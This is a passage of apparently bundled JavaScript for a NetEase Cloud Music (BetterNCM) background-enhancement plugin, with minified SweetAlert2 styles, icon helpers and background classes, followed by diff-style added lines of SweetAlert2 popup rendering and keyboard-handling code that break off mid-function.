.75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}')});var C1=e1(o2());var K2=e1(o2()),_2={color:void 0,size:void 0,className:void 0,style:void 0,attr:void 0},q2=K2.default.createContext&&K2.default.createContext(_2);var n1=function(){return n1=Object.assign||function(e){for(var v,l=1,n=arguments.length;l<n;l++){v=arguments[l];for(var o in v)Object.prototype.hasOwnProperty.call(v,o)&&(e[o]=v[o])}return e},n1.apply(this,arguments)},L3=function(e,v){var l={};for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&v.indexOf(n)<0&&(l[n]=e[n]);if(e!=null&&typeof Object.getOwnPropertySymbols=="function")for(var o=0,n=Object.getOwnPropertySymbols(e);o<n.length;o++)v.indexOf(n[o])<0&&Object.prototype.propertyIsEnumerable.call(e,n[o])&&(l[n[o]]=e[n[o]]);return l};function Jt(e){return e&&e.map(function(v,l){return C1.default.createElement(v.tag,n1({key:l},v.attr),Jt(v.child))})}function O1(e){return function(v){return C1.default.createElement(B3,n1({attr:n1({},e.attr)},v),Jt(e.child))}}function B3(e){var v=function(l){var n=e.attr,o=e.size,p=e.title,u=L3(e,["attr","size","title"]),z=o||l.size||"1em",d;return l.className&&(d=l.className),e.className&&(d=(d?d+" ":"")+e.className),C1.default.createElement("svg",n1({stroke:"currentColor",fill:"currentColor",strokeWidth:"0"},l.attr,n,u,{className:d,style:n1(n1({color:e.color||l.color},l.style),e.style),height:z,width:z,xmlns:"http://www.w3.org/2000/svg"}),p&&C1.default.createElement("title",null,p),e.children)};return q2!==void 0?C1.default.createElement(q2.Consumer,null,function(l){return v(l)}):v(_2)}function Xt(e){return O1({tag:"svg",attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0z"}},{tag:"path",attr:{d:"M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"}}]})(e)}function t0(e){return O1({tag:"svg",attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0V0z"}},{tag:"path",attr:{d:"M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 00.12-.61l-1.92-3.32a.488.488 0 00-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 00-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 00-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"}}]})(e)}function a0(e){return O1({tag:"svg",attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0z"}},{tag:"path",attr:{d:"M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"}}]})(e)}function S1(e){return O1({tag:"svg",attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0z"}},{tag:"path",attr:{d:"M3 5h2V3c-1.1 0-2 .9-2 2zm0 8h2v-2H3v2zm4 8h2v-2H7v2zM3 9h2V7H3v2zm10-6h-2v2h2V3zm6 0v2h2c0-1.1-.9-2-2-2zM5 21v-2H3c0 1.1.9 2 2 2zm-2-4h2v-2H3v2zM9 3H7v2h2V3zm2 18h2v-2h-2v2zm8-8h2v-2h-2v2zm0 8c1.1 0 2-.9 2-2h-2v2zm0-12h2V7h-2v2zm0 8h2v-2h-2v2zm-4 4h2v-2h-2v2zm0-16h2V3h-2v2zM7 17h10V7H7v10zm2-8h6v6H9V9z"}}]})(e)}function h0(e){return O1({tag:"svg",attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0z"}},{tag:"path",attr:{d:"M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H3V4h18v12z"}}]})(e)}var g1=class extends Error{constructor(v,l){super(v,l)}};function C3(e){for(var v="",l="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=l.length,o=0;o<e;o++)v+=l.charAt(Math.floor(Math.random()*n));return v}var b=class{async onConfig(){}current=!1;id=C3(12);async previewBackground(){throw new g1("Method previewBackground is not implemented")}async backgroundElement(){throw new g1("Method backgroundElement is not implemented")}static default(){throw new g1("Method default is not implemented")}static async askAndCreate(){throw new g1("Method create is not implemented")}hooks__onBeforeAddBackground(v){}hooks__onBeforeRemoveBackground(v){}};L(b,"attributes",[]),L(b,"backgroundTypeName");var r0=e1(A1());var d2=class extends b{constructor(v){super(),this.css=v}css;async backgroundElement(){return h("div",{style:{width:"100px",height:"100px",background:this.css}},h("div",{style:{width:"100%",height:"100%",background:this.css}}))}async previewBackground(){return()=>h("div",{style:{background:this.css}})}static default(){return new d2("gray")}static async askAndCreate(){let v=await r0.default.fire({title:"\u521B\u5EFA\u4E00\u4E2ACSS\u80CC\u666F",text:"\u4F60\u53EF\u4EE5\u5728\u6B64\u5199\u5165\u4EFB\u4F55\u53EF\u4EE5\u4F5C\u4E3A background \u503C\u7684\u5B57\u7B26\u4E32\u3002\u5B83\u5C06\u88AB\u4F5C\u4E3A\u80CC\u666F\u4F7F\u7528\u3002",input:"text"});return v.value?new d2(v.value):null}},z1=d2;L(z1,"backgroundTypeName","CSS");function M1(e,v,l=JSON.parse,n=JSON.stringify){let[o,p]=React.useState(()=>{try{let z=window.localStorage.getItem(e);return z?l(z):v}catch(z){return console.log(z),v}});return[o,z=>{try{let d=z instanceof Function?z(o):z;p(d),window.localStorage.setItem(e,n(d))}catch(d){console.log(d)}}]}function O3(e){return typeof e=="function"?e():e}var X={pending:"pending",rejected:"rejected",resolved:"resolved"},e0={error:void 0,result:void 0,state:X.pending};function S3(e,v){switch(v.type){case X.pending:return e0;case X.resolved:return{error:void 0,result:v.payload,state:X.resolved};case X.rejected:return{error:v.payload,result:void 0,state:X.rejected};default:return e}}function c0(e,v){let[{error:l,result:n,state:o},p]=React.useReducer(S3,e0);return React.useEffect(()=>{if(e=O3(e),!e)return;let u=!1;return p({type:X.pending}),e.then(z=>!u&&p({payload:z,type:X.resolved}),z=>!u&&p({payload:z,type:X.rejected})),()=>{u=!0}},v),[n,l,o]}function n0(e,v){let l=React.useRef();React.useEffect(()=>{l.current=e},[e]),React.useEffect(()=>{function n(){l.current()}let o=setInterval(n,v);return()=>clearInterval(o)},[])}var v0="cc.microblock.bgenhanced.backgroundlist",l0="cc.microblock.bgenhanced.backgroundmode",i0="cc.microblock.bgenhanced.backgroundscale",o0="cc.microblock.bgenhanced.backgrounblur",d0="cc.microblock.bgenhanced.backgroundbrightness";var p0=e1(o2());var Y2="",g2=class extends b{constructor(v){super(),this.ImageUrl=v}ImageUrl;async backgroundElement(){return h("img",{className:"BGE-coverImageBG",src:";"})}async previewBackground(){return()=>h("div",{className:"BGE-coverImageBG",style:{background:"transparent"}})}static async askAndCreate(){return Y2="",new g2("")}static default(){return new g2("")}},U1=g2;L(U1,"backgroundTypeName","\u5F53\u524D\u5C01\u9762");setInterval(async()=>{let e=v=>new Promise((l,n)=>{let o=new Image;o.onload=l,o.onerror=n,o.src=v});if(document.querySelector(".normal.j-cover, .cmd-image")){let v=`${document.querySelector(".normal.j-cover, .cmd-image").src.split("?")[1]}`;Y2!==v&&(Y2=v,await e(v));for(let l of document.querySelectorAll(".BGE-coverImageBG"))l.getAttribute("src")&&l.setAttribute("src",v),l.style.background&&(l.style.background=`url(${v}) 0% 0% / cover`)}},300);var y1,z2=class extends b{constructor(l){super();L(this,"ImageUrl");K(this,y1,void 0);this.ImageUrl=l}async getMountedImageUrl(){return j(this,y1)===void 0&&J(this,y1,betterncm.fs.mountFile(this.ImageUrl)),await j(this,y1)}async backgroundElement(){return h("img",{src:await this.getMountedImageUrl()})}async previewBackground(){let l=await this.getMountedImageUrl();return()=>h("div",{style:{background:`url(${l}) 0% 0% / cover`}})}static default(){return new z2("")}static async askAndCreate(){let l=await betterncm.app.openFileDialog(".webp .png .jpg\0","./");return l?new z2(l):null}},$1=z2;y1=new WeakMap,L($1,"backgroundTypeName","\u56FE\u7247");var g0=e1(A1());var b1=class extends b{#t=0;resetRecursiveCount(){this.#t=0}checkRecursive(){return this.#t++>50}};var p1,j1,Z2,G1,J2,M2=class extends b1{constructor(){super(...arguments);K(this,j1);K(this,G1);L(this,"target");L(this,"maskColor","#ffffff22");L(this,"maskBlur",0);K(this,p1,void 0)}async onConfig(){let l=()=>{let[o,p]=React.useState(this.target),[u,z]=React.useState(this.maskColor.slice(0,7)),[d,M]=React.useState(parseInt(this.maskColor.slice(7,9),16)),[I,C]=React.useState(this.maskBlur);function R(O,t1){var A="000"+O;return A.substr(A.length-t1)}React.useEffect(()=>{this.target=o,this.maskColor=u+R(d.toString(16),2),console.log(R(d.toString(16),2)),this.maskBlur=I},[o,u,d,I]);let G=O=>{p(O.id)},v1=React.useMemo(()=>U.backgroundList.filter(O=>O!==this),[]);return h(f,null,h("div",null,h("span",null,"\u906E\u7F69\u989C\u8272\uFF1A"),h("input",{type:"color",value:u,onChange:O=>z(O.target.value)}),h("br",null),h("span",null,"\u906E\u7F69\u900F\u660E\u5EA6\uFF1A"),h("input",{type:"range",value:d,min:0,max:255,step:1,onChange:O=>M(parseFloat(O.target.value))}),h("br",null),h("span",null,"\u906E\u7F69\u9AD8\u65AF\u6A21\u7CCA\uFF1A"),h("input",{type:"range",value:I,min:0,max:60,step:1,onChange:O=>C(parseFloat(O.target.value))}),h("br",null)),h("div",null,"\u906E\u7F69\u5BF9\u8C61\uFF1A"),h(K1,{backgroundList:v1,currentIDs:[o],buttons:O=>h(f,null,h("span",{className:"btn",onClick:()=>G(O)},h(S1,{color:"white"})))}))},n=g0.default.fire({title:"\u906E\u7F69\u80CC\u666F\u8BBE\u7F6E",html:"<div id=MaskedBackgroundConfigContainer class=BGEnhanced-Config style='font-size:.5em;' />"});ReactDOM.render(h(l,null),document.getElementById("MaskedBackgroundConfigContainer")),await n,J(this,p1,void 0),this.resetRecursiveCount()}async previewBackground(){if(this.checkRecursive())return()=>h("div",null,"Potential circular reference detected.");let l=await(await c1(this,j1,Z2).call(this)).previewBackground();return()=>h(f,null,l,h("div",{className:`bgMask-${this.id}`}),h("style",null,c1(this,G1,J2).call(this)))}async backgroundElement(){return this.checkRecursive()?h("div",null,"Potential circular reference detected."):h(f,null,await(await c1(this,j1,Z2).call(this)).backgroundElement(),h("div",{className:`bgMask-${this.id}`}),h("style",null,c1(this,G1,J2).call(this)))}static default(){return new M2}static async askAndCreate(){let l=new M2;return await l.onConfig(),l}},k1=M2;p1=new WeakMap,j1=new WeakSet,Z2=async function(){return j(this,p1)||J(this,p1,Promise.race([betterncm.utils.waitForFunction(()=>U.backgroundList.length),betterncm.utils.delay(1e3).then(l=>Promise.reject("Timeout"))]).then(()=>U.backgroundList.find(l=>l.id===this.target))),j(this,p1)},G1=new WeakSet,J2=function(){return`
+`;
+        const setContent = (icon, params) => {
+          let oldContent = icon.innerHTML;
+          let newContent;
+          if (params.iconHtml) {
+            newContent = iconContent(params.iconHtml);
+          } else if (params.icon === "success") {
+            newContent = successIconHtml;
+            oldContent = oldContent.replace(/ style=".*?"/g, "");
+          } else if (params.icon === "error") {
+            newContent = errorIconHtml;
+          } else {
+            const defaultIconHtml = {
+              question: "?",
+              warning: "!",
+              info: "i"
+            };
+            newContent = iconContent(defaultIconHtml[params.icon]);
+          }
+          if (oldContent.trim() !== newContent.trim()) {
+            setInnerHtml(icon, newContent);
+          }
+        };
+        const setColor = (icon, params) => {
+          if (!params.iconColor) {
+            return;
+          }
+          icon.style.color = params.iconColor;
+          icon.style.borderColor = params.iconColor;
+          for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
+            setStyle(icon, sel, "backgroundColor", params.iconColor);
+          }
+          setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
+        };
+        const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
+        const renderImage = (instance, params) => {
+          const image = getImage();
+          if (!params.imageUrl) {
+            hide(image);
+            return;
+          }
+          show(image, "");
+          image.setAttribute("src", params.imageUrl);
+          image.setAttribute("alt", params.imageAlt);
+          applyNumericalStyle(image, "width", params.imageWidth);
+          applyNumericalStyle(image, "height", params.imageHeight);
+          image.className = swalClasses.image;
+          applyCustomClass(image, params, "image");
+        };
+        const renderPopup = (instance, params) => {
+          const container = getContainer();
+          const popup = getPopup();
+          if (params.toast) {
+            applyNumericalStyle(container, "width", params.width);
+            popup.style.width = "100%";
+            popup.insertBefore(getLoader(), getIcon());
+          } else {
+            applyNumericalStyle(popup, "width", params.width);
+          }
+          applyNumericalStyle(popup, "padding", params.padding);
+          if (params.color) {
+            popup.style.color = params.color;
+          }
+          if (params.background) {
+            popup.style.background = params.background;
+          }
+          hide(getValidationMessage());
+          addClasses$1(popup, params);
+        };
+        const addClasses$1 = (popup, params) => {
+          popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? params.showClass.popup : ""}`;
+          if (params.toast) {
+            addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
+            addClass(popup, swalClasses.toast);
+          } else {
+            addClass(popup, swalClasses.modal);
+          }
+          applyCustomClass(popup, params, "popup");
+          if (typeof params.customClass === "string") {
+            addClass(popup, params.customClass);
+          }
+          if (params.icon) {
+            addClass(popup, swalClasses[`icon-${params.icon}`]);
+          }
+        };
+        const renderProgressSteps = (instance, params) => {
+          const progressStepsContainer = getProgressSteps();
+          if (!params.progressSteps || params.progressSteps.length === 0) {
+            hide(progressStepsContainer);
+            return;
+          }
+          show(progressStepsContainer);
+          progressStepsContainer.textContent = "";
+          if (params.currentProgressStep >= params.progressSteps.length) {
+            warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
+          }
+          params.progressSteps.forEach((step, index) => {
+            const stepEl = createStepElement(step);
+            progressStepsContainer.appendChild(stepEl);
+            if (index === params.currentProgressStep) {
+              addClass(stepEl, swalClasses["active-progress-step"]);
+            }
+            if (index !== params.progressSteps.length - 1) {
+              const lineEl = createLineElement(params);
+              progressStepsContainer.appendChild(lineEl);
+            }
+          });
+        };
+        const createStepElement = (step) => {
+          const stepEl = document.createElement("li");
+          addClass(stepEl, swalClasses["progress-step"]);
+          setInnerHtml(stepEl, step);
+          return stepEl;
+        };
+        const createLineElement = (params) => {
+          const lineEl = document.createElement("li");
+          addClass(lineEl, swalClasses["progress-step-line"]);
+          if (params.progressStepsDistance) {
+            applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
+          }
+          return lineEl;
+        };
+        const renderTitle = (instance, params) => {
+          const title = getTitle();
+          toggle(title, params.title || params.titleText, "block");
+          if (params.title) {
+            parseHtmlToContainer(params.title, title);
+          }
+          if (params.titleText) {
+            title.innerText = params.titleText;
+          }
+          applyCustomClass(title, params, "title");
+        };
+        const render = (instance, params) => {
+          renderPopup(instance, params);
+          renderContainer(instance, params);
+          renderProgressSteps(instance, params);
+          renderIcon(instance, params);
+          renderImage(instance, params);
+          renderTitle(instance, params);
+          renderCloseButton(instance, params);
+          renderContent(instance, params);
+          renderActions(instance, params);
+          renderFooter(instance, params);
+          if (typeof params.didRender === "function") {
+            params.didRender(getPopup());
+          }
+        };
+        function hideLoading() {
+          const innerParams = privateProps.innerParams.get(this);
+          if (!innerParams) {
+            return;
+          }
+          const domCache = privateProps.domCache.get(this);
+          hide(domCache.loader);
+          if (isToast()) {
+            if (innerParams.icon) {
+              show(getIcon());
+            }
+          } else {
+            showRelatedButton(domCache);
+          }
+          removeClass([domCache.popup, domCache.actions], swalClasses.loading);
+          domCache.popup.removeAttribute("aria-busy");
+          domCache.popup.removeAttribute("data-loading");
+          domCache.confirmButton.disabled = false;
+          domCache.denyButton.disabled = false;
+          domCache.cancelButton.disabled = false;
+        }
+        const showRelatedButton = (domCache) => {
+          const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
+          if (buttonToReplace.length) {
+            show(buttonToReplace[0], "inline-block");
+          } else if (allButtonsAreHidden()) {
+            hide(domCache.actions);
+          }
+        };
+        function getInput(instance) {
+          const innerParams = privateProps.innerParams.get(instance || this);
+          const domCache = privateProps.domCache.get(instance || this);
+          if (!domCache) {
+            return null;
+          }
+          return getInput$1(domCache.popup, innerParams.input);
+        }
+        const isVisible = () => {
+          return isVisible$1(getPopup());
+        };
+        const clickConfirm = () => getConfirmButton() && getConfirmButton().click();
+        const clickDeny = () => getDenyButton() && getDenyButton().click();
+        const clickCancel = () => getCancelButton() && getCancelButton().click();
+        const DismissReason = Object.freeze({
+          cancel: "cancel",
+          backdrop: "backdrop",
+          close: "close",
+          esc: "esc",
+          timer: "timer"
+        });
+        const removeKeydownHandler = (globalState2) => {
+          if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
+            globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
+              capture: globalState2.keydownListenerCapture
+            });
+            globalState2.keydownHandlerAdded = false;
+          }
+        };
+        const addKeydownHandler = (instance, globalState2, innerParams, dismissWith) => {
+          removeKeydownHandler(globalState2);
+          if (!innerParams.toast) {
+            globalState2.keydownHandler = (e) => keydownHandler(instance, e, dismissWith);
+            globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
+            globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
+            globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
+              capture: globalState2.keydownListenerCapture
+            });
+            globalState2.keydownHandlerAdded = true;
+          }
+        };
+        const setFocus = (index, increment) => {
+          const focusableElements = getFocusableElements();
+          if (focusableElements.length) {
+            index = index + increment;
+            if (index === focusableElements.length) {
+              index = 0;
+            } else if (index === -1) {
+              index = focusableElements.length - 1;
+            }
+            focusableElements[index].focus();
+            return;
+          }
+          getPopup().focus();
+        };
+        const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
+        const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
+        const keydownHandler = (instance, event, dismissWith) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          if (!innerParams) {
+            return;
+          }
+          if (event.isComposing || event.keyCode === 229) {
+            return;
+          }
+          if (innerParams.stopKeydownPropagation) {
+            event.stopPropagation();
+          }
+          if (event.key === "Enter") {
+            handleEnter(instance, event, innerParams);
+          } else if (event.key === "Tab") {
+            handleTab(event);
+          } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
+            handleArrows(event.key);
+          } else if (event.key === "Escape") {
+            handleEsc(event, innerParams, dismissWith);
+          }
+        };
+        const handleEnter = (instance, event, innerParams) => {
+          if (!callIfFunction(innerParams.allowEnterKey)) {
+            return;
+          }
+          if (event.target && instance.getInput() && event.target instanceof HTMLElement && event.target.outerHTML === instance.getInput().outerHTML) {
+            if (["textarea", "file"].includes(innerParams.input)) {
+              return;
